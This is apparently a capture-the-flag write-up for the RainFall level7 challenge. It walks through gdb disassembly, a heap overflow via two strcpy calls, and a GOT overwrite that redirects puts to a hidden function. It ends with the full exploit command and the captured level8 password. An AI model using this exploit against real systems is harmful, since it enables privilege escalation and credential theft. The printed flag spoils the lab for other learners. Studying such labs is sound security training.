
# Preparations

Entering level7 home directory we see a level7 binary with sticky bit in access rights.
By objdumping the binary we see 2 functions: main and m:

	level7@RainFall:~$ objdump -D -M intel-mnemonic level7 > /tmp/dump

Why do we do objdump first? Maybe in this exercise a function exists but is not used so we need to see all the functions.

# Code writing

We start to work with gdb in Intel syntax (set disassembly-flavor intel):

	(gdb) disass main
	Dump of assembler code for function main:
	   0x08048521 <+0>:	push   ebp
	   0x08048522 <+1>:	mov    ebp,esp
	   0x08048524 <+3>:	and    esp,0xfffffff0
	   0x08048527 <+6>:	sub    esp,0x20
	   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8		;argument for malloc
	   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>		;call malloc with arguments
	   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax 	;malloc result saved to some variable
	   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c] 	;getting ready with a variable
	   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1 		;1st index in the string
	   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8 		;argument for malloc
	   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>		;call malloc with arguments
	   0x08048550 <+47>:	mov    edx,eax
	   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c] 	;malloc result saved to the variable
	   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx 		;getting ready with a variable
	   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8 		;argument for malloc
	   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>		;call malloc with arguments
	   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax 	;malloc result saved to a variable
	   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18] 	;getting ready with some variable
	   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2 		;2nd index in a string variable
	   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8 		;argument to malloc
	   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>		;call malloc with arguments
	   0x0804857f <+94>:	mov    edx,eax
	   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18] 	;результат malloc в переменную
	   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx  	;getting ready with some variable
	   0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc] 		;argv array
	   0x0804858b <+106>:	add    eax,0x4 ;аргумент argv[1]	;1st argv string
	   0x0804858e <+109>:	mov    eax,DWORD PTR [eax]		;getting ready to strcpy
	   0x08048590 <+111>:	mov    edx,eax				;getting ready to strcpy
	   0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c] 	;argument for strcpy
	   0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4] 		;argument for strcpy
	   0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx 		;argument for strcpy
	   0x0804859d <+124>:	mov    DWORD PTR [esp],eax 		;argument for strcpy
	   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>		;call strcpy with arguments
	   0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc] 		;argv array
	   0x080485a8 <+135>:	add    eax,0x8 				;2nd string from argv
	   0x080485ab <+138>:	mov    eax,DWORD PTR [eax]		;getting ready to strcpy
	   0x080485ad <+140>:	mov    edx,eax				;getting ready to strcpy
	   0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18] 	;argument for strcpy
	   0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4] 		;argument for strcpy
	   0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx 		;argument for strcpy
	   0x080485ba <+153>:	mov    DWORD PTR [esp],eax 		;argument for strcpy
	   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>		;call strcpy with arguments
	   0x080485c2 <+161>:	mov    edx,0x80486e9 			;getting ready to fopen
	   0x080485c7 <+166>:	mov    eax,0x80486eb 			;getting ready to fopen
	   0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx 		;argument for fopen
	   0x080485d0 <+175>:	mov    DWORD PTR [esp],eax  		;argument for fopen
	   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>		;call fopen with arguments
	   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax 		;fopen result saved in a variable
	   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44 	;arguments for fgets
	   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960 	;arguments for fgets
	   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>		;call fgets with arguments
	   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703 	;arguments for puts
	   0x080485f7 <+214>:	call   0x8048400 <puts@plt>		;call puts with arguments
	   0x080485fc <+219>:	mov    eax,0x0 				;should be return(0)
	   0x08048601 <+224>:	leave
	   0x08048602 <+225>:	ret

Something new!\
Let's look at the m function:

	(gdb) disass m
	Dump of assembler code for function m:
	   0x080484f4 <+0>:	push   ebp
	   0x080484f5 <+1>:	mov    ebp,esp
	   0x080484f7 <+3>:	sub    esp,0x18
	   0x080484fa <+6>:	mov    DWORD PTR [esp],0x0		;argument to time
	   0x08048501 <+13>:	call   0x80483d0 <time@plt>		;call time with arguments
	   0x08048506 <+18>:	mov    edx,0x80486e0			;getting ready to printf
	   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax		;argument to prinf
	   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960	;argument to prinf
	   0x08048517 <+35>:	mov    DWORD PTR [esp],edx		;argument to prinf
	   0x0804851a <+38>:	call   0x80483b0 <printf@plt>		;call printf with arguments
	   0x0804851f <+43>:	leave
	   0x08048520 <+44>:	ret

Let's see some insites by their addresses:

	(gdb) x/s 0x08049960
		0x8049960 <c>:	 ""

Seems like it is a global variable, let's check:

	Disassembly of section .bss:
		08049960 <c>:
		...

Yap. Continuing:

    (gdb) x/s 0x8048703
		0x8048703:	 "~~"
	(gdb) x/s 0x80486e9
		0x80486e9:	 "r"
	(gdb) x/s 0x80486eb
		0x80486eb:	 "/home/user/level8/.pass"
	(gdb) x/s 0x80486e0
		0x80486e0:	 "%s - %d\n"

Here we do not call `m` function but it seems that it should be called.\
All the strings, arguments and FILE streams are known now.

# Exploitation

Time prints a global variable. It seems that we should put there a token with the help of `fopen` that opens a file with password and call `m` function instead of `puts` to print a token. The address of the `m` function is 0x080484f4 that is \xf4\x84\x04\x08 in little-endian. And `puts` has the following address:

	08048400 <puts@plt>:
		8048400:	ff 25 28 99 04 08    	jmp    DWORD PTR ds:0x8049928
		8048406:	68 28 00 00 00       	push   0x28
		804840b:	e9 90 ff ff ff       	jmp    80483a0 <_init+0x34>

So the address of real `puts` is 0x8049928 that is \x28\x99\x04\x08 in little-endian. Not let's find out how we should change \x28\x99\x04\x08 to \xf4\x84\x04\x08 in little-endian:

	Breakpoint 3, 0x080485eb in main ()
	(gdb) x/i $eip
		=> 0x80485eb <main+202>:	call   0x80483c0 <fgets@plt>
	(gdb) x/50wx $esp
		0xbffff6c0:	*0x08049960*	*0x00000044*	0x00000000	**0xb7e5ee55**
		0xbffff6d0:	0xb7fed280	0x00000000	|0x0804a028|	|0x0804a008|
		0xbffff6e0:	0x08048610	0x00000000	0x00000000	**0xb7e454d3**
		0xbffff6f0:	0x00000003	0xbffff784	0xbffff794	0xb7fdc858
		0xbffff700:	0x00000000	0xbffff71c	0xbffff794	0x00000000
		0xbffff710:	0x0804825c	0xb7fd0ff4	0x00000000	0x00000000
		0xbffff720:	0x00000000	0x1f6272eb	0x2826b6fb	0x00000000
		0xbffff730:	0x00000000	0x00000000	0x00000003	0x08048440
		0xbffff740:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4
		0xbffff750:	0x00000003	0x08048440	0x00000000	0x08048461
		0xbffff760:	0x08048521	0x00000003	0xbffff784	0x08048610
		0xbffff770:	0x08048680	0xb7fed280	0xbffff77c	0xb7fff918
		0xbffff780:	0x00000003	0xbffff8bd
	(gdb) info frame
		Stack level 0, frame at 0xbffff6f0:
		 eip = 0x80485eb in main; saved eip **0xb7e454d3**
		 Arglist at 0xbffff6e8, args:
		 Locals at 0xbffff6e8, Previous frame's sp is 0xbffff6f0
		 Saved registers:
		  ebp at 0xbffff6e8, eip at 0xbffff6ec
	(gdb) x/wx *0x08049960*
		0x8049960 <c>:	0x00000000
	(gdb) x/wx 0xb7e5ee55
		**0xb7e5ee55** <__cxa_atexit+53>:	0x5b18c483
	(gdb) x/wx 0x0804a028
		0x804a028:	0x00000002
	(gdb) x/wx 0x0804a008
		0x804a008:	0x00000001

With * we see a global variable and an argument to `fgets`. With ** we see address of exit function and address to exit main in general. With | we see two arguments sent to the binary. These two addresses argument adresses we see in malloc operations:

	Breakpoint 8, 0x0804853a in main ()
	(gdb) x/wx $esp+0x1c
		0xbffff6dc:	|0x0804a008|

	Breakpoint 9, 0x08048569 in main ()
	(gdb) x/wx $esp+0x18
		0xbffff6d8:	|0x0804a028|

Let's see what we have after strcpy if we send two arguments `./level7 abc edf`:

	(gdb) x/50wx 0x0804a008
		0x804a008:	*0x00000001*	**0x0804a018**	0x00000000	0x00000011
		**0x804a018**:	|0x00636261|	0x00000000	0x00000000	0x00000011
		0x804a028:	*0x00000002*	**0x0804a038**	0x00000000	0x00000011
		**0x804a038**:	|0x00666564|	0x00000000	0x00000000	0x00020fc1
		0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a0c8:	0x00000000	0x00000000

With | we see "abc\0" and "edf\0". We also have malloc inside malloc - it is marked with **. Let's try to overfill the first argument and see what we have:

	Starting program: /home/user/level7/level7 AAAAAAAAAAAAAAAAAAAA BBBB
	Breakpoint 10, 0x080485c2 in main ()
	(gdb) x/50wx $esp
		0xbffff6b0:	0x0804a000	0xbffff8d5	0xb7fd0ff4	0xb7e5ee55
		0xbffff6c0:	0xb7fed280	0x00000000	|0x0804a028|	|0x0804a008|
		0xbffff6d0:	0x08048610	0x00000000	0x00000000	0xb7e454d3
		0xbffff6e0:	0x00000003	0xbffff774	0xbffff784	0xb7fdc858
		0xbffff6f0:	0x00000000	0xbffff71c	0xbffff784	0x00000000
		0xbffff700:	0x0804825c	0xb7fd0ff4	0x00000000	0x00000000
		0xbffff710:	0x00000000	0x3e347a7e	0x09709e6e	0x00000000
		0xbffff720:	0x00000000	0x00000000	0x00000003	0x08048440
		0xbffff730:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4
		0xbffff740:	0x00000003	0x08048440	0x00000000	0x08048461
		0xbffff750:	0x08048521	0x00000003	0xbffff774	0x08048610
		0xbffff760:	0x08048680	0xb7fed280	0xbffff76c	0xb7fff918
		0xbffff770:	0x00000003	0xbffff8a7

First argument is lower in stack so we can look at it and see the second arguments as well:

	(gdb) x/20wx 0x0804a008
		|0x804a008|:	0x00000001	**0x0804a018**	0x00000000	0x00000011
		**0x804a018**:	0x41414141	0x41414141	0x41414141	0x41414141
		|0x804a028|:	0x41414141	**0x0804a000**	0x00000000	0x00000011
		0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
		0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000

We see that now at 0x804a028 + 4 address lies so other address than 0x804a038 - it is 0x0804a000. What we have there:

	(gdb) x/20wx 0x0804a000
		0x804a000:	*0x42424242*	0x00000000	0x00000001	0x0804a018
		0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
		0x804a020:	0x41414141	0x41414141	0x41414141	0x0804a000

Now there lies our second argument "BBBB\0". Let's try to change this 0x0804a000 to some real address:

	Starting program: /home/user/level7/level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') BBBB

Why 20? Because under address **0x804a018** should be 16 + 4 bytes to come to address that is now 0x0804a000.

	Breakpoint 10, 0x080485c2 in main ()
	(gdb) x/50wx $esp
		0xbffff6b0:	0x08049928	0xbffff8d5	0xb7fd0ff4	0xb7e5ee55
		0xbffff6c0:	0xb7fed280	0x00000000	|0x0804a028|	|0x0804a008|
		0xbffff6d0:	0x08048610	0x00000000	0x00000000	0xb7e454d3
		0xbffff6e0:	0x00000003	0xbffff774	0xbffff784	0xb7fdc858
		0xbffff6f0:	0x00000000	0xbffff71c	0xbffff784	0x00000000
		0xbffff700:	0x0804825c	0xb7fd0ff4	0x00000000	0x00000000
		0xbffff710:	0x00000000	0x5c587dae	0x6b1c99be	0x00000000
		0xbffff720:	0x00000000	0x00000000	0x00000003	0x08048440
		0xbffff730:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4
		0xbffff740:	0x00000003	0x08048440	0x00000000	0x08048461
		0xbffff750:	0x08048521	0x00000003	0xbffff774	0x08048610
		0xbffff760:	0x08048680	0xb7fed280	0xbffff76c	0xb7fff918
		0xbffff770:	0x00000003	0xbffff8a3
	(gdb) x/20wx 0x0804a008
		|0x804a008|:	0x00000001	0x0804a018	0x00000000	0x00000011
		0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
		|0x804a028|:	0x41414141	**0x08049928**	0x00000000	0x00000011
		0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
		0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
	(gdb) x/20wx 0x08049928
		0x8049928 <puts@got.plt>:	*0x42424242*	*0x08048400*	0xb7e453e0	0x08048436
		0x8049938 <data_start>:	0x00000000	0x00000000	0x00000000	0x00000000
		0x8049948:	0x00000000	0x00000000	0x00000000	0x00000000
		0x8049958:	0x00000000	0x00000000	0x00000000	0x00000000
		0x8049968 <c+8>:	0x00000000	0x00000000	0x00000000	0x00000000

We see that we changed real `puts` address to "BBBB". Before it was 0x8049928. And it is called from `main` under 0x08048400:
   
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>

That is how we can change real `puts` to `m` using two arguments sent to binary level7!

# Result

    level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')						5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 	- 1636538566